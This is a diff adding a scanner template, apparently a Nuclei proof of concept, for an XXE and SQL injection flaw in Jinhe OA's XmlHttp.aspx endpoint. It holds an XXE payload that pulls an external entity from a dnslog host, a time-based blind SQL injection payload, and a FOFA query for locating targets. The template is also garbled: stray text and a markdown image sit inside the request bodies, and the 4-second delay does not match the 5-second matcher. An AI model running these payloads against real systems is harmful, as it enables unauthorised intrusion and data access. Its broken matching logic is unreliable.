@@ -1,0 +1,58 @@
+id: poc-4188869847
+info:
+  name: 金和OA JHSoft.Web.DepartmentsXml Http.aspx 存在XXE+SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,xxe,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+    fofa: app="金和网络-金和OA"
+http:
+- raw:
+  - 'POST /c6/JHSoft.Web.Departments/XmlHttp.aspx/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+
+    <?xml version="1.0" encoding="UTF-8"?>
+
+    <!DOCTYPE root [
+
+    <!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
+
+    %remote;]>
+
+    <root/>
+
+
+    SQL注入：'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /c6/JHSoft.Web.Departments/XmlHttp.aspx/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+
+    <root>
+
+    <Flag>GetSubDeptsByID</Flag>
+
+    <deptid>{{htmlhex(1;waitfor delay''0:0:4''--)}}</deptid>
+
+    </root>
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1775998843877-aa6e0a94-c3ea-4503-889f-a25c07d52953.png)'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
